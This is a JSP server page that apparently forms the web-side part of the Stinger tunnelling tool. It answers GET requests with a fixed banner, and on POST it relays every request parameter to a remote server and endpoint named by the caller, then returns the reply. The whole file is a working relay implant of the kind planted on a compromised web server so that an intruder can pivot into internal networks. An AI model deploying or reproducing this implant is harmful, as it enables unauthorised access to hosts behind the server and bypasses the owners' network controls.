<%@ page language="java" import="java.net.*,java.util.*,java.io.*,java.net.*" contentType="text/html; charset=utf-8" %>
<%!
    public static class HttpRequest {
        public static String sendPost(String url, byte[] param) {

            BufferedReader in = null;
            OutputStream ou = null;
            String result = "";
            try {
                URL realUrl = new URL(url);

                URLConnection conn = realUrl.openConnection();

                //conn.setRequestProperty("accept", "*/*");
                //conn.setRequestProperty("Connection", "keep-alive");
                conn.setDoOutput(true);
                conn.setDoInput(true);

                ou = conn.getOutputStream();
                ou.write(param);
                ou.flush();
                in = new BufferedReader(
                        new InputStreamReader(conn.getInputStream()));
                String line;
                while ((line = in.readLine()) != null) {
                    result += line;
                }
            } catch (Exception e) {
                System.out.println("error to send post！" + e);
                return "30" + e.toString();
            } finally {
                try {
                    if (ou != null) {
                        ou.close();
                    }
                    if (in != null) {
                        in.close();
                    }
                } catch (IOException ex) {
                    return "40" +ex.toString();
                }
            }
            return result;
        }
		public static String doPost(String httpUrl, byte[] param) {
			StringBuffer result=new StringBuffer();
			//连接
			HttpURLConnection connection=null;
			OutputStream os=null;
			InputStream is=null;
			BufferedReader br=null;
			try {
				//创建连接对象
				URL url=new URL(httpUrl);
				//创建连接
				connection= (HttpURLConnection) url.openConnection();
				//设置请求方法
				connection.setRequestMethod("POST");
				//设置连接超时时间
				connection.setConnectTimeout(10000);
				//设置读取超时时间
				connection.setReadTimeout(10000);
				//设置是否可读取
				connection.setDoOutput(true);
				//设置响应是否可读取
				connection.setDoInput(true);
				//设置参数类型
				connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
				connection.setRequestProperty("accept", "*/*");
				connection.setRequestProperty("Connection", "keep-alive");
				//拼装参数
				if(param!=null&&!param.equals("")){
					//设置参数
					os=connection.getOutputStream();
					//拼装参数
					os.write(param);
				}
				//设置权限
				//设置请求头等
				//开启连接
				//connection.connect();
				//读取响应
				if(connection.getResponseCode()==200){
					is=connection.getInputStream();
					if(is!=null){
						br=new BufferedReader(new InputStreamReader(is,"UTF-8"));
						String temp=null;
						if((temp=br.readLine())!=null){
							result.append(temp);
						}
					}
				}
				//关闭连接
			} catch (MalformedURLException e) {
				e.printStackTrace();
			} catch (IOException e) {
				e.printStackTrace();
			}finally {
				if(br!=null){
					try {
						br.close();
					} catch (IOException e) {
						e.printStackTrace();
					}
				}
				if(os!=null){
					try {
						os.close();
					} catch (IOException e) {
						e.printStackTrace();
					}
				}
				if(is!=null){
					try {
						is.close();
					} catch (IOException e) {
						e.printStackTrace();
					}
				}
				//关闭连接
				connection.disconnect();
			}
			return result.toString();
		}
    }
%>
<%
    String method = request.getMethod();
    if (method == "GET") {
        out.print("stinger jsp!");
        return;
    } else if (method == "POST") {
        String Endpoint = request.getParameter("Endpoint");
        String Remoteserver = request.getParameter("Remoteserver");
        String url = Remoteserver + Endpoint;
        String post_arg = "";
        String returnString="";
        Enumeration enu = request.getParameterNames();
        while (enu.hasMoreElements()) {
            String paraName = (String) enu.nextElement();
            post_arg = post_arg+paraName+"="+request.getParameter(URLEncoder.encode(paraName,"UTF-8"))+"&";

        }
        returnString = HttpRequest.doPost(url, post_arg.getBytes());
        out.print(returnString);
    }
%>
